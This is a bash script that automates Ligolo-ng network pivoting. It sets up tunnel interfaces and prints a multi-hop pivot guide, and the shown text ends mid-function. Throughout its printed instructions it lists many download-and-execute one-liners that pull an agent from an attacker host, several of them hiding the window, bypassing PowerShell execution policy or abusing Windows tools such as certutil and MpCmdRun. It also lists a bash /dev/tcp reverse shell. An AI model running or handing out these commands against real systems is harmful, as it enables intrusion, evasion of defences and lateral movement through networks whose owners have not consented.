#!/bin/bash
#==============================================================================
#                         LIGOLO-NG AUTOMATION v3.2
#==============================================================================
# Features:
#   - Fixed port 11601 for easy multi-pivot
#   - Support for Pivot 1, 2, 3, 4+ with dedicated interfaces
#   - Automatic interface creation
#   - Full interactive console
#   - Complete multi-pivot guides
#==============================================================================

set -o pipefail

LIGOLO_VERSION="v0.7.2-alpha"
WORK_DIR="$HOME/ligolo"

# FIXED PORT - Same port used for ALL pivots!
LIGOLO_PORT=11601

#------------------------------------------------------------------------------
# COLORS
#------------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m'

#------------------------------------------------------------------------------
# LOGGING
#------------------------------------------------------------------------------
info()    { echo -e "${CYAN}[*]${NC} $1"; }
success() { echo -e "${GREEN}[+]${NC} $1"; }
warn()    { echo -e "${YELLOW}[!]${NC} $1"; }
error()   { echo -e "${RED}[-]${NC} $1"; }
cmd()     { echo -e "    ${GREEN}$1${NC}"; }
note()    { echo -e "    ${WHITE}# $1${NC}"; }

#------------------------------------------------------------------------------
# PORT MANAGEMENT
#------------------------------------------------------------------------------
random_port() {
    local min=${1:-10000}
    local max=${2:-60000}
    if [[ -r /dev/urandom ]]; then
        echo $(( min + $(od -An -tu2 -N2 /dev/urandom | tr -d ' ') % (max - min) ))
    else
        echo $(( min + RANDOM % (max - min) ))
    fi
}

port_in_use() {
    local port=$1
    ss -tuln 2>/dev/null | grep -qE ":${port}\b" || \
    netstat -tuln 2>/dev/null | grep -qE ":${port}\b"
}

find_free_port() {
    local base=${1:-10000}
    local max_attempts=50
    local port
    
    for ((i=0; i<max_attempts; i++)); do
        port=$(random_port 10000 60000)
        if ! port_in_use "$port"; then
            echo "$port"
            return 0
        fi
    done
    
    port=$base
    while port_in_use "$port"; do ((port++)); done
    echo "$port"
}

check_ligolo_port() {
    if port_in_use "$LIGOLO_PORT"; then
        warn "Port $LIGOLO_PORT is in use!"
        read -p "Kill the process? [y/N]: " choice
        if [[ "$choice" =~ ^[Yy]$ ]]; then
            local pid=$(lsof -ti:$LIGOLO_PORT 2>/dev/null | head -1)
            [[ -n "$pid" ]] && kill -9 "$pid" 2>/dev/null && sleep 1 && success "Killed"
        else
            LIGOLO_PORT=$(find_free_port 11601)
            warn "Using alternative port: $LIGOLO_PORT"
        fi
    fi
}

get_default_ip() {
    ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1 || \
    ip -4 addr show tap0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1 || \
    ip -4 route get 1 2>/dev/null | grep -oP 'src \K\d+(\.\d+){3}' | head -1 || \
    hostname -I 2>/dev/null | awk '{print $1}'
}

#------------------------------------------------------------------------------
# BINARY FUNCTIONS
#------------------------------------------------------------------------------
verify_binary() {
    local file=$1
    local min_size=1000000
    [[ ! -f "$file" ]] && return 1
    local size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file" 2>/dev/null)
    [[ $size -lt $min_size ]] && return 1
    if [[ "$file" == *.exe ]]; then
        head -c 2 "$file" 2>/dev/null | grep -q "MZ" || return 1
    else
        file "$file" 2>/dev/null | grep -q "ELF" || return 1
    fi
    return 0
}

get_binary_info() {
    local file=$1
    if [[ -f "$file" ]]; then
        local size=$(stat -c%s "$file" 2>/dev/null)
        local md5=$(md5sum "$file" 2>/dev/null | cut -d' ' -f1)
        echo "$size:$md5"
    else
        echo "0:none"
    fi
}

setup_binaries() {
    mkdir -p "$WORK_DIR"
    cd "$WORK_DIR" || exit 1
    
    local BASE_URL="https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VERSION}"
    
    if ! verify_binary "proxy"; then
        info "Downloading proxy..."
        rm -f proxy proxy.tar.gz 2>/dev/null
        wget -q --show-progress "$BASE_URL/ligolo-ng_proxy_${LIGOLO_VERSION#v}_linux_amd64.tar.gz" -O proxy.tar.gz && \
        tar -xzf proxy.tar.gz proxy 2>/dev/null && rm -f proxy.tar.gz LICENSE README.md && chmod +x proxy
        verify_binary "proxy" && success "Proxy downloaded" || error "Proxy failed"
    else
        success "Proxy OK"
    fi
    
    if ! verify_binary "agent"; then
        info "Downloading Linux agent..."
        rm -f agent agent.tar.gz 2>/dev/null
        wget -q --show-progress "$BASE_URL/ligolo-ng_agent_${LIGOLO_VERSION#v}_linux_amd64.tar.gz" -O agent.tar.gz && \
        tar -xzf agent.tar.gz agent 2>/dev/null && rm -f agent.tar.gz LICENSE README.md && chmod +x agent
        verify_binary "agent" && success "Linux agent downloaded" || error "Linux agent failed"
    else
        success "Linux agent OK"
    fi
    
    if ! verify_binary "agent.exe"; then
        info "Downloading Windows agent..."
        rm -f agent.exe agent.zip 2>/dev/null
        wget -q --show-progress "$BASE_URL/ligolo-ng_agent_${LIGOLO_VERSION#v}_windows_amd64.zip" -O agent.zip && \
        unzip -qo agent.zip agent.exe 2>/dev/null && rm -f agent.zip LICENSE README.md
        verify_binary "agent.exe" && success "Windows agent downloaded" || error "Windows agent failed"
    else
        success "Windows agent OK"
    fi
    
    local agent_info=$(get_binary_info "$WORK_DIR/agent")
    local win_info=$(get_binary_info "$WORK_DIR/agent.exe")
    AGENT_SIZE=$(echo "$agent_info" | cut -d: -f1)
    AGENT_MD5=$(echo "$agent_info" | cut -d: -f2)
    WIN_SIZE=$(echo "$win_info" | cut -d: -f1)
    WIN_MD5=$(echo "$win_info" | cut -d: -f2)
}

#------------------------------------------------------------------------------
# INTERFACE MANAGEMENT
#------------------------------------------------------------------------------
get_interface_name() {
    local num="${1:-1}"
    if [[ "$num" -eq 1 ]]; then
        echo "ligolo"
    else
        echo "ligolo${num}"
    fi
}

setup_interface() {
    local iface="${1:-ligolo}"
    
    if ip link show "$iface" &>/dev/null; then
        sudo ip link set "$iface" up 2>/dev/null
        success "Interface '$iface' ready"
    else
        info "Creating $iface interface..."
        if sudo ip tuntap add user "$(whoami)" mode tun "$iface" 2>/dev/null; then
            sudo ip link set "$iface" up
            success "Interface '$iface' created"
        else
            error "Failed to create $iface"
            cmd "sudo ip tuntap add user $(whoami) mode tun $iface"
            cmd "sudo ip link set $iface up"
            return 1
        fi
    fi
    
    [[ "$iface" == "ligolo" ]] && sudo ip route add 240.0.0.1/32 dev ligolo 2>/dev/null || true
    return 0
}

setup_all_interfaces() {
    local count="${1:-4}"
    echo ""
    info "Setting up $count interfaces for multi-pivot..."
    for ((i=1; i<=count; i++)); do
        local iface=$(get_interface_name $i)
        setup_interface "$iface"
    done
}

list_interfaces() {
    echo ""
    info "Ligolo interfaces:"
    local found=0
    for i in 1 2 3 4 5 6 7 8; do
        local iface=$(get_interface_name $i)
        if ip link show "$iface" &>/dev/null; then
            found=1
            local state=$(ip link show "$iface" 2>/dev/null | grep -oP 'state \K\w+')
            echo -e "    ${GREEN}✓${NC} $iface ($state)"
            ip route show dev "$iface" 2>/dev/null | while read line; do
                echo -e "        → $line"
            done
        fi
    done
    [[ $found -eq 0 ]] && echo -e "    ${YELLOW}(none)${NC}"
}

#------------------------------------------------------------------------------
# GENERATE COMMANDS FILE
#------------------------------------------------------------------------------
generate_commands() {
    cat > "$WORK_DIR/commands.txt" << CMDEOF
================================================================================
LIGOLO-NG COMMANDS v3.2 - MULTI-PIVOT EDITION
================================================================================
Attacker IP:    $ATTACKER_IP
Ligolo Port:    $LIGOLO_PORT  <-- FIXED (same for all pivots!)
HTTP Port:      $HTTP_PORT
--------------------------------------------------------------------------------
Linux Agent:    $AGENT_SIZE bytes
Windows Agent:  $WIN_SIZE bytes
================================================================================

=== QUICK START ===

# Terminal 1: HTTP Server
cd $WORK_DIR && python3 -m http.server $HTTP_PORT

# Pivot1 (Linux):
wget http://$ATTACKER_IP:$HTTP_PORT/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert

# Pivot1 (Windows):
certutil -urlcache -f http://$ATTACKER_IP:$HTTP_PORT/agent.exe C:\Windows\Temp\agent.exe
C:\Windows\Temp\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert

================================================================================
MULTI-PIVOT ARCHITECTURE
================================================================================

┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
│ ATTACKER │───►│  PIVOT1  │───►│  PIVOT2  │───►│  PIVOT3  │───►│  PIVOT4  │
│          │    │          │    │          │    │          │    │          │
│ Proxy    │    │ Listener │    │ Listener │    │ Listener │    │          │
│ :$LIGOLO_PORT    │    │ :$LIGOLO_PORT    │    │ :$LIGOLO_PORT    │    │ :$LIGOLO_PORT    │    │          │
└──────────┘    └──────────┘    └──────────┘    └──────────┘    └──────────┘
    │               │               │               │               │
 ligolo          ligolo2         ligolo3         ligolo4            │
    │               │               │               │               │
    ▼               ▼               ▼               ▼               ▼
Network A       Network B       Network C       Network D       Network E

================================================================================
INTERFACE SETUP (run on attacker)
================================================================================

# Create all interfaces at once:
sudo ip tuntap add user \$(whoami) mode tun ligolo && sudo ip link set ligolo up
sudo ip tuntap add user \$(whoami) mode tun ligolo2 && sudo ip link set ligolo2 up
sudo ip tuntap add user \$(whoami) mode tun ligolo3 && sudo ip link set ligolo3 up
sudo ip tuntap add user \$(whoami) mode tun ligolo4 && sudo ip link set ligolo4 up

# Or use script:
$0 interface 4

================================================================================
PIVOT 1 (First Pivot - Direct Connection)
================================================================================

1. Run agent on Pivot1:
   Linux:   /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert
   Windows: agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert

2. In Ligolo console:
   session          # Select Pivot1
   ifconfig         # See networks
   start            # Uses 'ligolo' interface

3. Add route:
   sudo ip route add <PIVOT1_NETWORK>/24 dev ligolo

================================================================================
PIVOT 2 (Through Pivot1)
================================================================================

1. Create listener on Pivot1 (in Ligolo, Pivot1 selected):
   listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp

2. Create ligolo2 interface:
   sudo ip tuntap add user \$(whoami) mode tun ligolo2
   sudo ip link set ligolo2 up

3. Transfer agent to Pivot2:
   # On Pivot1: python3 -m http.server 8888
   # On Pivot2: wget http://PIVOT1_IP:8888/agent -O /tmp/agent

4. Run agent on Pivot2 (connects to PIVOT1's internal IP!):
   /tmp/agent -connect PIVOT1_INTERNAL_IP:$LIGOLO_PORT -ignore-cert

5. In Ligolo:
   session              # Select Pivot2
   start --tun ligolo2  # Use ligolo2!

6. Add route:
   sudo ip route add <PIVOT2_NETWORK>/24 dev ligolo2

================================================================================
PIVOT 3 (Through Pivot2)
================================================================================

1. Create listener on Pivot2 (in Ligolo, Pivot2 selected):
   listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp

2. Create ligolo3 interface:
   sudo ip tuntap add user \$(whoami) mode tun ligolo3
   sudo ip link set ligolo3 up

3. Transfer agent to Pivot3:
   # On Pivot2: python3 -m http.server 8888
   # On Pivot3: wget http://PIVOT2_IP:8888/agent -O /tmp/agent

4. Run agent on Pivot3 (connects to PIVOT2's internal IP!):
   /tmp/agent -connect PIVOT2_INTERNAL_IP:$LIGOLO_PORT -ignore-cert

5. In Ligolo:
   session              # Select Pivot3
   start --tun ligolo3  # Use ligolo3!

6. Add route:
   sudo ip route add <PIVOT3_NETWORK>/24 dev ligolo3

================================================================================
PIVOT 4 (Through Pivot3)
================================================================================

1. Create listener on Pivot3 (in Ligolo, Pivot3 selected):
   listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp

2. Create ligolo4 interface:
   sudo ip tuntap add user \$(whoami) mode tun ligolo4
   sudo ip link set ligolo4 up

3. Transfer agent to Pivot4:
   # On Pivot3: python3 -m http.server 8888
   # On Pivot4: wget http://PIVOT3_IP:8888/agent -O /tmp/agent

4. Run agent on Pivot4 (connects to PIVOT3's internal IP!):
   /tmp/agent -connect PIVOT3_INTERNAL_IP:$LIGOLO_PORT -ignore-cert

5. In Ligolo:
   session              # Select Pivot4
   start --tun ligolo4  # Use ligolo4!

6. Add route:
   sudo ip route add <PIVOT4_NETWORK>/24 dev ligolo4

================================================================================
QUICK REFERENCE TABLE
================================================================================

┌─────────┬─────────────────┬──────────────┬─────────────────────────────────┐
│ PIVOT   │ INTERFACE       │ LIGOLO CMD   │ AGENT CONNECTS TO               │
├─────────┼─────────────────┼──────────────┼─────────────────────────────────┤
│ Pivot1  │ ligolo          │ start        │ ATTACKER:$LIGOLO_PORT                  │
│ Pivot2  │ ligolo2         │ start --tun ligolo2 │ PIVOT1_IP:$LIGOLO_PORT          │
│ Pivot3  │ ligolo3         │ start --tun ligolo3 │ PIVOT2_IP:$LIGOLO_PORT          │
│ Pivot4  │ ligolo4         │ start --tun ligolo4 │ PIVOT3_IP:$LIGOLO_PORT          │
└─────────┴─────────────────┴──────────────┴─────────────────────────────────┘

LISTENER (same for all pivots):
listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp

================================================================================
REVERSE PORT FORWARD
================================================================================

Catch shells from ANY internal network:

1. Attacker: nc -lvnp 4444

2. Ligolo (on the pivot closest to target):
   listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

3. Target connects to that PIVOT's internal IP:
   bash -i >& /dev/tcp/PIVOT_IP/4444 0>&1

================================================================================
TROUBLESHOOTING
================================================================================

"a tunnel is already using this interface name"
  → Use: start --tun ligolo2 (or ligolo3, ligolo4)
  → Create interface first!

"connection refused" on pivot
  → Listener port must be $LIGOLO_PORT
  → listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp

"TLS handshake error"
  → Agent corrupted, re-download

================================================================================
CMDEOF

    success "Commands saved to $WORK_DIR/commands.txt"
}

#------------------------------------------------------------------------------
# PRINT INSTRUCTIONS
#------------------------------------------------------------------------------
print_instructions() {
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}${BOLD}              LIGOLO-NG READY - MULTI-PIVOT${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo -e "  Attacker IP:    ${GREEN}$ATTACKER_IP${NC}"
    echo -e "  Ligolo Port:    ${GREEN}$LIGOLO_PORT${NC}  ${YELLOW}<-- FIXED${NC}"
    echo -e "  HTTP Port:      ${GREEN}$HTTP_PORT${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 1: Start HTTP server${NC}"
    cmd "cd $WORK_DIR && python3 -m http.server $HTTP_PORT"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 2: Download & Execute Agent${NC}"
    echo ""
    echo -e "  ${CYAN}─── LINUX TRANSFER METHODS ───${NC}"
    echo ""
    echo -e "  ${WHITE}wget:${NC}"
    cmd "wget http://$ATTACKER_IP:$HTTP_PORT/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}curl:${NC}"
    cmd "curl http://$ATTACKER_IP:$HTTP_PORT/agent -o /tmp/agent && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}curl (pipe to file):${NC}"
    cmd "curl -s http://$ATTACKER_IP:$HTTP_PORT/agent > /tmp/agent && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}Python3:${NC}"
    cmd "python3 -c \"import urllib.request;urllib.request.urlretrieve('http://$ATTACKER_IP:$HTTP_PORT/agent','/tmp/agent')\" && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}Python2:${NC}"
    cmd "python -c \"import urllib2;open('/tmp/agent','wb').write(urllib2.urlopen('http://$ATTACKER_IP:$HTTP_PORT/agent').read())\" && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}Perl:${NC}"
    cmd "perl -e 'use LWP::Simple;getstore(\"http://$ATTACKER_IP:$HTTP_PORT/agent\",\"/tmp/agent\");' && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}PHP:${NC}"
    cmd "php -r \"file_put_contents('/tmp/agent',file_get_contents('http://$ATTACKER_IP:$HTTP_PORT/agent'));\" && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}Ruby:${NC}"
    cmd "ruby -e \"require 'open-uri';File.write('/tmp/agent',URI.open('http://$ATTACKER_IP:$HTTP_PORT/agent').read)\" && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}Netcat:${NC}"
    note "On attacker: nc -lvnp $HTTP_PORT < $WORK_DIR/agent"
    cmd "nc $ATTACKER_IP $HTTP_PORT > /tmp/agent && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}/dev/tcp (Bash built-in):${NC}"
    cmd "cat < /dev/tcp/$ATTACKER_IP/$HTTP_PORT > /tmp/agent && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}Base64 (copy-paste):${NC}"
    note "On attacker: base64 -w0 $WORK_DIR/agent | xclip -selection clipboard"
    cmd "echo 'BASE64_STRING' | base64 -d > /tmp/agent && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}SCP (if SSH access):${NC}"
    cmd "scp user@$ATTACKER_IP:$WORK_DIR/agent /tmp/agent && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${CYAN}─── WINDOWS TRANSFER METHODS ───${NC}"
    echo ""
    echo -e "  ${WHITE}certutil:${NC}"
    cmd "certutil -urlcache -f http://$ATTACKER_IP:$HTTP_PORT/agent.exe C:\\Windows\\Temp\\agent.exe && C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}PowerShell (IWR):${NC}"
    cmd "powershell -c \"iwr http://$ATTACKER_IP:$HTTP_PORT/agent.exe -OutFile C:\\Windows\\Temp\\agent.exe\" && C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}PowerShell (Invoke-WebRequest full):${NC}"
    cmd "powershell -c \"Invoke-WebRequest -Uri http://$ATTACKER_IP:$HTTP_PORT/agent.exe -OutFile C:\\Windows\\Temp\\agent.exe\" && C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}PowerShell (WebClient):${NC}"
    cmd "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$ATTACKER_IP:$HTTP_PORT/agent.exe','C:\\Windows\\Temp\\agent.exe')\" && C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}PowerShell (Start-BitsTransfer):${NC}"
    cmd "powershell -c \"Start-BitsTransfer -Source http://$ATTACKER_IP:$HTTP_PORT/agent.exe -Destination C:\\Windows\\Temp\\agent.exe\" && C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}PowerShell (Bypass execution policy):${NC}"
    cmd "powershell -ep bypass -c \"iwr http://$ATTACKER_IP:$HTTP_PORT/agent.exe -OutFile C:\\Windows\\Temp\\agent.exe; C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert\""
    echo ""
    echo -e "  ${WHITE}PowerShell (Hidden window):${NC}"
    cmd "powershell -w hidden -c \"iwr http://$ATTACKER_IP:$HTTP_PORT/agent.exe -OutFile C:\\Windows\\Temp\\agent.exe; Start-Process C:\\Windows\\Temp\\agent.exe -ArgumentList '-connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert'\""
    echo ""
    echo -e "  ${WHITE}Bitsadmin:${NC}"
    cmd "bitsadmin /transfer job /download /priority high http://$ATTACKER_IP:$HTTP_PORT/agent.exe C:\\Windows\\Temp\\agent.exe && C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}curl (Windows 10+):${NC}"
    cmd "curl http://$ATTACKER_IP:$HTTP_PORT/agent.exe -o C:\\Windows\\Temp\\agent.exe && C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}wget (if available):${NC}"
    cmd "wget http://$ATTACKER_IP:$HTTP_PORT/agent.exe -O C:\\Windows\\Temp\\agent.exe && C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}SMB:${NC}"
    note "On attacker: impacket-smbserver share $WORK_DIR -smb2support"
    cmd "copy \\\\$ATTACKER_IP\\share\\agent.exe C:\\Windows\\Temp\\agent.exe && C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}SMB (with creds):${NC}"
    note "On attacker: impacket-smbserver share $WORK_DIR -smb2support -user test -password test"
    cmd "net use \\\\$ATTACKER_IP\\share /user:test test && copy \\\\$ATTACKER_IP\\share\\agent.exe C:\\Windows\\Temp\\agent.exe && C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}Base64 (PowerShell):${NC}"
    note "On attacker: base64 -w0 $WORK_DIR/agent.exe | xclip -selection clipboard"
    cmd "powershell -c \"[IO.File]::WriteAllBytes('C:\\Windows\\Temp\\agent.exe',[Convert]::FromBase64String('BASE64_STRING'))\" && C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}MpCmdRun (Windows Defender):${NC}"
    cmd "MpCmdRun -DownloadFile -url http://$ATTACKER_IP:$HTTP_PORT/agent.exe -path C:\\Windows\\Temp\\agent.exe && C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}CScript/WScript:${NC}"
    cmd "echo var WinHttpReq=new ActiveXObject('WinHttp.WinHttpRequest.5.1');WinHttpReq.Open('GET','http://$ATTACKER_IP:$HTTP_PORT/agent.exe',false);WinHttpReq.Send();BinStream=new ActiveXObject('ADODB.Stream');BinStream.Type=1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile('C:\\\\Windows\\\\Temp\\\\agent.exe'); > dl.js && cscript dl.js && C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 3: In Ligolo${NC}"
    echo -e "    ${GREEN}session${NC} (arrow keys) → ${GREEN}ifconfig${NC} → ${GREEN}start${NC}"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 4: Add route${NC}"
    cmd "sudo ip route add <NETWORK>/24 dev ligolo"
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "  ${WHITE}Commands:${NC}       ${YELLOW}cat $WORK_DIR/commands.txt${NC}"
    echo -e "  ${WHITE}Pivot guide:${NC}    ${YELLOW}$0 pivot${NC}"
    echo -e "  ${WHITE}Add interface:${NC}  ${YELLOW}$0 interface 2${NC} (or 3, 4...)"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
}

#------------------------------------------------------------------------------
# SHOW PIVOT GUIDE
#------------------------------------------------------------------------------
show_pivot_guide() {
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}              MULTI-PIVOT COMPLETE GUIDE${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${WHITE}${BOLD}  ARCHITECTURE:${NC}"
    echo ""
    echo -e "  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐"
    echo -e "  │ ATTACKER │───►│  PIVOT1  │───►│  PIVOT2  │───►│  PIVOT3  │───►..."
    echo -e "  │ :$LIGOLO_PORT    │    │ :$LIGOLO_PORT    │    │ :$LIGOLO_PORT    │    │ :$LIGOLO_PORT    │"
    echo -e "  └──────────┘    └──────────┘    └──────────┘    └──────────┘"
    echo -e "       │               │               │               │"
    echo -e "    ${GREEN}ligolo${NC}         ${GREEN}ligolo2${NC}        ${GREEN}ligolo3${NC}        ${GREEN}ligolo4${NC}"
    echo ""
    echo -e "${RED}${BOLD}  KEY: All listeners use port $LIGOLO_PORT!${NC}"
    echo ""
    
    # PIVOT 1
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  PIVOT 1 - Direct Connection to Attacker${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${WHITE}1. Run agent on Pivot1:${NC}"
    cmd "/tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}2. In Ligolo:${NC}"
    cmd "session"
    note "Select Pivot1 with arrow keys"
    cmd "ifconfig"
    cmd "start"
    echo ""
    echo -e "  ${WHITE}3. Add route (new terminal):${NC}"
    cmd "sudo ip route add 172.16.0.0/16 dev ligolo"
    echo ""
    
    # PIVOT 2
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  PIVOT 2 - Through Pivot1${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${WHITE}1. Create listener on Pivot1:${NC}"
    note "In Ligolo, Pivot1 selected"
    cmd "listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp"
    echo ""
    echo -e "  ${WHITE}2. Create ligolo2 interface:${NC}"
    cmd "sudo ip tuntap add user \$(whoami) mode tun ligolo2"
    cmd "sudo ip link set ligolo2 up"
    note "Or: $0 interface 2"
    echo ""
    echo -e "  ${WHITE}3. Transfer agent to Pivot2:${NC}"
    note "On Pivot1:"
    cmd "python3 -m http.server 8888"
    note "On Pivot2:"
    cmd "wget http://PIVOT1_IP:8888/agent -O /tmp/agent && chmod +x /tmp/agent"
    echo ""
    echo -e "  ${WHITE}4. Run agent on Pivot2:${NC}"
    cmd "/tmp/agent -connect PIVOT1_INTERNAL_IP:$LIGOLO_PORT -ignore-cert"
    echo -e "                        ${YELLOW}^^^^^^^^^^^^^^^^^${NC}"
    echo -e "                        ${YELLOW}PIVOT1's internal IP!${NC}"
    echo ""
    echo -e "  ${WHITE}5. In Ligolo:${NC}"
    cmd "session"
    note "Select Pivot2"
    cmd "start --tun ligolo2"
    echo -e "              ${YELLOW}^^^^^^^^${NC}"
    echo ""
    echo -e "  ${WHITE}6. Add route:${NC}"
    cmd "sudo ip route add <PIVOT2_NETWORK>/24 dev ligolo2"
    echo ""
    
    # PIVOT 3
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  PIVOT 3 - Through Pivot2${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${WHITE}1. Create listener on Pivot2:${NC}"
    note "In Ligolo, Pivot2 selected"
    cmd "listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp"
    echo ""
    echo -e "  ${WHITE}2. Create ligolo3 interface:${NC}"
    cmd "sudo ip tuntap add user \$(whoami) mode tun ligolo3"
    cmd "sudo ip link set ligolo3 up"
    note "Or: $0 interface 3"
    echo ""
    echo -e "  ${WHITE}3. Transfer agent to Pivot3:${NC}"
    note "On Pivot2:"
    cmd "python3 -m http.server 8888"
    note "On Pivot3:"
    cmd "wget http://PIVOT2_IP:8888/agent -O /tmp/agent && chmod +x /tmp/agent"
    echo ""
    echo -e "  ${WHITE}4. Run agent on Pivot3:${NC}"
    cmd "/tmp/agent -connect PIVOT2_INTERNAL_IP:$LIGOLO_PORT -ignore-cert"
    echo -e "                        ${YELLOW}^^^^^^^^^^^^^^^^^${NC}"
    echo -e "                        ${YELLOW}PIVOT2's internal IP!${NC}"
    echo ""
    echo -e "  ${WHITE}5. In Ligolo:${NC}"
    cmd "session"
    note "Select Pivot3"
    cmd "start --tun ligolo3"
    echo ""
    echo -e "  ${WHITE}6. Add route:${NC}"
    cmd "sudo ip route add <PIVOT3_NETWORK>/24 dev ligolo3"
    echo ""
    
    # PIVOT 4
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
